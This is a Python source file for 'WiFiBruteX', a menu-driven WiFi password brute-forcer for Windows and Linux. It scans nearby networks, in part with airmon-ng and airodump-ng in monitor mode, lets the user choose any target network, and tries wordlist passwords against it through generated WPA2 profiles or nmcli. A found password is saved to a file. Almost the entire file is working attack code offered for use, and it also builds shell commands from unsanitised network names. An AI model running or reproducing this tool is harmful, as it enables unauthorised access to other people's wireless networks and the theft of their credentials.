import os
import subprocess
import time
import platform
import ctypes
import sys
from dataclasses import dataclass
from typing import List, Optional

# Constants
VERSION = "1.1"
PASSWORD_FOUND_FILE = "Result_{}_PASSWORD.txt"

# Colors for console output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    DEFAULT = '\033[0m'

@dataclass
class NetworkInterface:
    name: str
    description: str
    id: str
    mac: str
    state: str = "unknown"

@dataclass
class WiFiNetwork:
    ssid: str
    bssid: str
    signal: str
    network_type: str
    frequency: str
    channel: str

class WiFiBruteX:
    def __init__(self):
        self.interfaces: List[NetworkInterface] = []
        self.selected_interface: Optional[NetworkInterface] = None
        self.networks: List[WiFiNetwork] = []
        self.target_network: Optional[WiFiNetwork] = None
        self.wordlist_file: Optional[str] = "wordlist.txt"  # Default wordlist file
        self.attack_counter: int = 2
        self.is_admin = False
        self.os_type = platform.system()
        
        if not os.path.exists(self.wordlist_file):
            self.wordlist_file = None

    def elevate_privileges(self):
        """Attempt to elevate privileges and restart the script"""
        try:
            if self.os_type == 'Windows':
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    print(f"{Colors.YELLOW}Requesting administrator privileges...{Colors.DEFAULT}")
                    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                    sys.exit(0)
            else:  # Linux/Unix
                if os.getuid() != 0:
                    print(f"{Colors.YELLOW}Requesting root privileges...{Colors.DEFAULT}")
                    os.execvp('sudo', ['sudo', 'python3'] + sys.argv)
                    sys.exit(0)
            
            self.is_admin = True
        except Exception as e:
            print(f"{Colors.RED}Failed to elevate privileges: {e}{Colors.DEFAULT}")
            sys.exit(1)

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_logo(self):
        self.clear_screen()
        print(f"\n{Colors.YELLOW} [----------------------------------------------------------------------------------]")
        print(f"{Colors.CYAN}")
        print("""                      __      ___ ___ _ ___          _           
                      \ \    / (_) __(_) _ )_ _ _  _| |_ _____ __
                       \ \/\/ /| | _|| | _ \ '_| || |  _/ -_) \ /
                        \_/\_/ |_|_| |_|___/_|  \_,_|\__\___/_\_\\""")
        print(f"                                                                                                    ")                                              
        print(f"                                            {Colors.CYAN}WiFi Brute Forcer {Colors.RED}{VERSION}")
        print(f"                                                      {Colors.YELLOW}Developed by {Colors.CYAN}SABIR")
        print(f"{Colors.YELLOW}                                                                                     ")
        print(f"{Colors.YELLOW} [-----------------------------------------------------------------------------------]")
        print(f"{Colors.DEFAULT}")

    def run_command(self, command: str) -> str:
        try:
            result = subprocess.run(command, shell=True, check=True, 
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 text=True, timeout=10)
            return result.stdout
        except subprocess.CalledProcessError as e:
            return ""
        except subprocess.TimeoutExpired:
            return ""

    def detect_interfaces(self):
        self.interfaces = []
        if self.os_type == 'Windows':
            output = self.run_command('netsh wlan show interfaces')
            current_interface = None
            for line in output.splitlines():
                line = line.strip()
                if "Name" in line:
                    if current_interface:
                        self.interfaces.append(current_interface)
                    name = line.split(":", 1)[1].strip()
                    current_interface = NetworkInterface(name=name, description="", id="", mac="")
                elif "Description" in line:
                    current_interface.description = line.split(":", 1)[1].strip()
                elif "GUID" in line:
                    current_interface.id = line.split(":", 1)[1].strip()
                elif "Physical address" in line:
                    current_interface.mac = line.split(":", 1)[1].strip()
                elif "State" in line:
                    current_interface.state = line.split(":", 1)[1].strip().lower()
            if current_interface:
                self.interfaces.append(current_interface)
        else:  # Linux
            output = self.run_command('iwconfig 2>/dev/null | grep -o "^\w\+"')
            for interface in output.splitlines():
                if interface.strip():
                    mac = self.run_command(f"cat /sys/class/net/{interface}/address").strip()
                    self.interfaces.append(NetworkInterface(
                        name=interface,
                        description=f"Wireless interface {interface}",
                        id=interface,
                        mac=mac,
                        state="up" if "up" in self.run_command(f"ip link show {interface}") else "down"
                    ))

    def select_interface(self):
        self.print_logo()
        if not self.interfaces:
            print(f"{Colors.RED}No network interfaces found!{Colors.DEFAULT}")
            time.sleep(2)
            return
        
        for i, interface in enumerate(self.interfaces, 1):
            print(f"{Colors.MAGENTA}{i}. {Colors.WHITE}{interface.description} ({Colors.BLUE}{interface.mac}{Colors.WHITE})")
        
        print(f"{Colors.RED}{len(self.interfaces)+1}. Cancel{Colors.DEFAULT}")
        
        try:
            choice = int(input(f"{Colors.GREEN}WiFiBruteX{Colors.WHITE} : {Colors.DEFAULT}").strip())
            if 1 <= choice <= len(self.interfaces):
                self.selected_interface = self.interfaces[choice-1]
                print(f"Selecting {self.selected_interface.description}...")
                time.sleep(1)
            elif choice == len(self.interfaces)+1:
                self.selected_interface = None
        except:
            print(f"{Colors.RED}Invalid input{Colors.DEFAULT}")
            time.sleep(1)

    def scan_networks(self):
        if not self.selected_interface:
            print(f"{Colors.RED}Select interface first!{Colors.DEFAULT}")
            return
        
        if self.os_type == 'Windows':
            self.run_command(f'netsh wlan disconnect interface="{self.selected_interface.name}"')
            print(f"{Colors.YELLOW}Scanning...", end='', flush=True)
            output = self.run_command(f'netsh wlan show networks mode=bssid interface="{self.selected_interface.name}"')
            
            self.networks = []
            current_network = None
            for line in output.splitlines():
                line = line.strip()
                if "SSID" in line and "BSSID" not in line:
                    if current_network:
                        self.networks.append(current_network)
                    ssid = line.split(":", 1)[1].strip() or "Hidden_Network"
                    current_network = WiFiNetwork(ssid=ssid, bssid="", signal="", 
                                               network_type="", frequency="", channel="")
                elif "BSSID" in line and current_network:
                    current_network.bssid = line.split(":", 1)[1].strip()
                elif "Signal" in line and current_network:
                    current_network.signal = line.split(":", 1)[1].strip()
            
            if current_network:
                self.networks.append(current_network)
        else:  # Linux
            print(f"{Colors.YELLOW}Putting interface in monitor mode...{Colors.DEFAULT}")
            self.run_command(f'sudo airmon-ng check kill')
            self.run_command(f'sudo ip link set {self.selected_interface.name} down')
            self.run_command(f'sudo iwconfig {self.selected_interface.name} mode monitor')
            self.run_command(f'sudo ip link set {self.selected_interface.name} up')
            
            print(f"{Colors.YELLOW}Scanning for networks (Ctrl+C to stop)...{Colors.DEFAULT}")
            try:
                scan_time = 10  # seconds
                output = self.run_command(f'sudo timeout {scan_time} airodump-ng {self.selected_interface.name}')
                
                self.networks = []
                # Parse airodump-ng output
                lines = output.split('\n')
                start_parsing = False
                for line in lines:
                    if 'BSSID' in line and 'ESSID' in line:
                        start_parsing = True
                        continue
                    if start_parsing and line.strip() == '':
                        break
                    if start_parsing and line.strip():
                        parts = line.split()
                        if len(parts) >= 14:
                            bssid = parts[0]
                            channel = parts[5]
                            signal = parts[8] + ' ' + parts[9]
                            ssid = ' '.join(parts[13:]) if len(parts) > 13 else 'Hidden'
                            self.networks.append(WiFiNetwork(
                                ssid=ssid,
                                bssid=bssid,
                                signal=signal,
                                network_type="",
                                frequency="",
                                channel=channel
                            ))
            except KeyboardInterrupt:
                pass
        
        self.display_networks()

    def display_networks(self):
        self.clear_screen()
        print(f"{Colors.CYAN}Available Networks:")
        for i, network in enumerate(self.networks, 1):
            print(f"{Colors.WHITE}{i:2}. {network.ssid.ljust(20)} {Colors.BLUE}{network.bssid}{Colors.WHITE} (Signal: {network.signal}, Channel: {network.channel})")
        
        try:
            choice = input(f"\n{Colors.GREEN}Select network (1-{len(self.networks)}) or Q: {Colors.DEFAULT}").strip().upper()
            if choice == 'Q':
                return
            choice = int(choice)
            if 1 <= choice <= len(self.networks):
                self.target_network = self.networks[choice-1]
        except:
            print(f"{Colors.RED}Invalid selection{Colors.DEFAULT}")
            time.sleep(1)

    def verify_connection(self) -> bool:
        if self.os_type == 'Windows':
            for _ in range(3):
                output = self.run_command(f'netsh wlan show interfaces')
                connected = False
                state = ""
                for line in output.splitlines():
                    line = line.strip()
                    if "State" in line:
                        state = line.split(":", 1)[1].strip().lower()
                    if "SSID" in line and self.target_network.ssid in line:
                        connected = True
                if connected and "connected" in state:
                    return True
                time.sleep(3)
        else:  # Linux
            for _ in range(3):
                output = self.run_command('iwconfig 2>/dev/null')
                if self.target_network.ssid in output:
                    return True
                time.sleep(3)
        return False

    def attack_network(self):
        if not all([self.wordlist_file, self.target_network, self.selected_interface]):
            print(f"{Colors.RED}Missing required parameters!{Colors.DEFAULT}")
            return
        
        with open(self.wordlist_file, 'r', errors='ignore') as f:
            passwords = [p.strip() for p in f if p.strip()]
        
        for idx, password in enumerate(passwords, 1):
            self.clear_screen()
            print(f"{Colors.CYAN}Attempt {idx}/{len(passwords)}")
            print(f"{Colors.YELLOW}Trying: {password}")
            
            if self.os_type == 'Windows':
                self.run_command(f'netsh wlan delete profile name="{self.target_network.ssid}"')
                self.create_wifi_profile(self.target_network.ssid, password)
                self.run_command(f'netsh wlan add profile filename="wifi_profile.xml"')
                self.run_command(f'netsh wlan connect name="{self.target_network.ssid}"')
            else:  # Linux
                # Try to connect using nmcli
                result = self.run_command(f'sudo nmcli device wifi connect "{self.target_network.ssid}" password "{password}"')
                if "successfully activated" in result:
                    print(f"\n{Colors.GREEN}SUCCESS! Password: {password}{Colors.DEFAULT}")
                    self.save_result(password, idx)
                    return
            
            if self.verify_connection():
                print(f"\n{Colors.GREEN}SUCCESS! Password: {password}{Colors.DEFAULT}")
                self.save_result(password, idx)
                return
            else:
                print(f"{Colors.RED}Failed{Colors.DEFAULT}")
            
            if self.os_type == 'Windows':
                os.remove("wifi_profile.xml")
            time.sleep(1)
        
        print(f"{Colors.RED}All passwords tried - no match found{Colors.DEFAULT}")

    def create_wifi_profile(self, ssid: str, password: str):
        template = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
        with open("wifi_profile.xml", "w") as f:
            f.write(template)

    def save_result(self, password: str, attempt: int):
        filename = PASSWORD_FOUND_FILE.format(self.target_network.ssid)
        with open(filename, 'w') as f:
            f.write(f"SSID: {self.target_network.ssid}\n")
            f.write(f"BSSID: {self.target_network.bssid}\n")
            f.write(f"Password: {password}\n")
            f.write(f"Found at attempt: {attempt}\n")
        print(f"{Colors.CYAN}Result saved to {filename}{Colors.DEFAULT}")

    def cleanup(self):
        """Clean up any changes made to the system"""
        if self.os_type != 'Windows' and self.selected_interface:
            print(f"{Colors.YELLOW}Restoring network interface...{Colors.DEFAULT}")
            self.run_command(f'sudo ip link set {self.selected_interface.name} down')
            self.run_command(f'sudo iwconfig {self.selected_interface.name} mode managed')
            self.run_command(f'sudo ip link set {self.selected_interface.name} up')
            self.run_command('sudo service NetworkManager restart')

    def main_menu(self):
        while True:
            self.print_logo()
            print(f"{Colors.YELLOW}Current Selections:")
            print(f"{Colors.MAGENTA}Interface: {Colors.CYAN}{self.selected_interface.name if self.selected_interface else 'Not selected'}")
            print(f"{Colors.MAGENTA}Target Network: {Colors.CYAN}{self.target_network.ssid if self.target_network else 'Not selected'}")
            print(f"{Colors.MAGENTA}Wordlist: {Colors.CYAN}{os.path.basename(self.wordlist_file) if self.wordlist_file else 'Not selected'}")
            print(f"{Colors.DEFAULT}")
            
            print(f"{Colors.MAGENTA}1. Select Interface")
            print(f"2. Scan Networks")
            print(f"3. Set Custom Wordlist")
            print(f"4. Start Attack")
            print(f"5. Exit{Colors.DEFAULT}")
            
            choice = input(f"{Colors.GREEN}WiFiBruteX{Colors.WHITE} : {Colors.DEFAULT}").strip()
            
            if choice == '1':
                self.detect_interfaces()
                self.select_interface()
            elif choice == '2':
                self.scan_networks()
            elif choice == '3':
                self.wordlist_file = input("Wordlist path: ").strip('"')
                if not os.path.exists(self.wordlist_file):
                    print(f"{Colors.RED}File not found!{Colors.DEFAULT}")
                    self.wordlist_file = None
                    time.sleep(1)
            elif choice == '4':
                if not all([self.wordlist_file, self.target_network, self.selected_interface]):
                    print(f"{Colors.RED}Please select interface, target network and wordlist first!{Colors.DEFAULT}")
                    time.sleep(2)
                else:
                    self.attack_network()
                    input("Press Enter to continue...")
            elif choice == '5':
                self.cleanup()
                break

if __name__ == "__main__":
    wbf = WiFiBruteX()
    wbf.elevate_privileges()
    wbf.main_menu()
